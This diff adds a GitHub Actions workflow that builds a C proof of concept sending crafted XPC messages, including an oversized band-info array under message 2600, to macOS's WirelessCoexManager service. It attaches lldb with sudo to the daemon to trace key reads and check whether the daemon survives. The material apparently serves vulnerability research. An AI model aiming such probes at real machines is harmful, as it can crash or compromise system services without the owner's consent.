@@ -1,0 +1,124 @@
+name: wcm-fix-reg
+on:
+  workflow_dispatch:
+
+jobs:
+  fix:
+    runs-on: macos-15
+    timeout-minutes: 15
+    steps:
+      - name: build poc with correct key
+        run: |
+          mkdir -p /tmp/w
+          cat > /tmp/w/poc.c <<'EOF'
+          #include <xpc/xpc.h>
+          #include <dispatch/dispatch.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          static const char *SVC = "com.apple.WirelessCoexManager";
+          static xpc_object_t send_sync(xpc_connection_t c, xpc_object_t msg, double t) {
+              dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+              __block xpc_object_t reply = NULL;
+              xpc_connection_send_message_with_reply(c, msg,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
+                  ^(xpc_object_t r) { reply = xpc_retain(r); dispatch_semaphore_signal(sem); });
+              if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(t*NSEC_PER_SEC))) != 0) return NULL;
+              return reply;
+          }
+          int main(int argc, char **argv) {
+              int nelem = (argc > 1) ? atoi(argv[1]) : 40;
+              xpc_connection_t c = xpc_connection_create_mach_service(SVC,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), 0);
+              if (!c) { printf("create=0\n"); return 1; }
+              xpc_connection_set_event_handler(c, ^(xpc_object_t e) { (void)e; });
+              xpc_connection_resume(c);
+              printf("connected\n"); fflush(stdout);
+              xpc_object_t reg = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(reg, "kMessageId", 1);
+              xpc_object_t a1 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(a1, "kWCMRegisterProcess_ProcessId", 3);
+              xpc_dictionary_set_value(reg, "kMessageArgs", a1);
+              xpc_object_t r = send_sync(c, reg, 3.0);
+              printf("register reply=%d\n", r != NULL);
+              if (r) xpc_release(r);
+              sleep(2);
+              xpc_object_t arr = xpc_array_create(NULL, 0);
+              for (int i = 0; i < nelem; i++) {
+                  xpc_object_t e = xpc_dictionary_create(NULL, NULL, 0);
+                  xpc_dictionary_set_uint64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_DirectionMask", 1);
+                  xpc_dictionary_set_int64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_CenterFreq", 1000 + i);
+                  xpc_dictionary_set_double(e, "kWCMCellularNetworkConfiguration_BandInfoSet_Bandwidth", 10.0);
+                  xpc_array_append_value(arr, e);
+                  xpc_release(e);
+              }
+              xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(m, "kMessageId", 2600);
+              xpc_object_t a = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_value(a, "kWCMCellularNetworkConfiguration_BandInformationSet", arr);
+              xpc_dictionary_set_int64(a, "kSubId", 0);
+              xpc_dictionary_set_value(m, "kMessageArgs", a);
+              printf("sending 2600 with %d elements\n", nelem); fflush(stdout);
+              xpc_object_t r2 = send_sync(c, m, 8.0);
+              printf("2600 reply=%d\n", r2 != NULL);
+              if (r2) xpc_release(r2);
+              sleep(2);
+              printf("DONE\n");
+              xpc_connection_cancel(c);
+              return 0;
+          }
+          EOF
+          clang -fblocks -O0 -o /tmp/w/poc /tmp/w/poc.c -framework Foundation
+          ls -la /tmp/w/poc
+        continue-on-error: true
+
+      - name: trace with correct key
+        run: |
+          set +e
+          PID=$(pgrep -x WirelessRadioManagerd | head -1)
+          echo "PID=$PID"
+          cat > /tmp/w/trace.lldb <<'LDB'
+          settings set auto-confirm true
+          br s -n xpc_dictionary_get_uint64
+          br s -n xpc_dictionary_get_value
+          br s -n xpc_dictionary_get_int64
+          br s -n xpc_array_get_count
+          br command add 1
+          expression -- (char*)$x1
+          continue
+          DONE
+          br command add 2
+          expression -- (char*)$x1
+          continue
+          DONE
+          br command add 3
+          expression -- (char*)$x1
+          continue
+          DONE
+          br command add 4
+          printf "ARRAY_COUNT\n"
+          continue
+          DONE
+          continue
+          LDB
+          ( sudo lldb -b -p "$PID" -s /tmp/w/trace.lldb > /tmp/w/trace.log 2>&1 ) &
+          LP=$!
+          sleep 8
+          echo "--- running poc ---"
+          /tmp/w/poc 40
+          echo "--- waiting 50s ---"
+          sleep 50
+          kill $LP 2>/dev/null; pkill -f "lldb -b -p" 2>/dev/null
+          sleep 2
+          echo "=== 完整键名序列（修好注册键之后）==="
+          grep -E '"k[A-Za-z]|ARRAY_COUNT' /tmp/w/trace.log | head -100
+          echo
+          echo "=== 命中统计 ==="
+          echo "total: $(grep -c '(char \*)' /tmp/w/trace.log)"
+          echo "array_count hits: $(grep -c 'ARRAY_COUNT' /tmp/w/trace.log)"
+          echo "kSubId reads: $(grep -c 'kSubId' /tmp/w/trace.log)"
+          echo "BandInformationSet reads: $(grep -c 'BandInformationSet' /tmp/w/trace.log)"
+          echo
+          echo "=== daemon alive? ==="
+          pgrep -x WirelessRadioManagerd
+          true
+        continue-on-error: true
